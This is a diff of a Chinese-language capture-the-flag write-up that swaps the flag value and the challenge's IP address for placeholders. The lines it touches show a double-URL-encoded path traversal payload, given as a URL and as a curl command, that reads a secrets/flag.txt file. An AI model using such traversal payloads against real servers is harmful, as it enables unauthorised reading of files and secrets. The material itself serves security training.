@@ -3,13 +3,13 @@
 ## Flag
 
 ```text
-TOGOGO-flag{4a4b85b7-0a32-46fc-b1f5-bdf487017ca8}
+TOGOGO-flag{}
 ```
 
 ## 题目入口
 
 ```text
-http://47.120.76.57:34310/
+http://目标地址/
 ```
 
 首页提示：
@@ -80,19 +80,19 @@ http://47.120.76.57:34310/
 浏览器直接访问：
 
 ```text
-http://47.120.76.57:34310/?file=..%252f..%252fsecrets%252fflag.txt
+http://目标地址/?file=..%252f..%252fsecrets%252fflag.txt
 ```
 
 或者用 curl：
 
 ```bash
-curl 'http://47.120.76.57:34310/?file=..%252f..%252fsecrets%252fflag.txt'
+curl 'http://目标地址/?file=..%252f..%252fsecrets%252fflag.txt'
 ```
 
 返回：
 
 ```text
-TOGOGO-flag{4a4b85b7-0a32-46fc-b1f5-bdf487017ca8}
+TOGOGO-flag{}
 ```
 
 ## 脚本运行
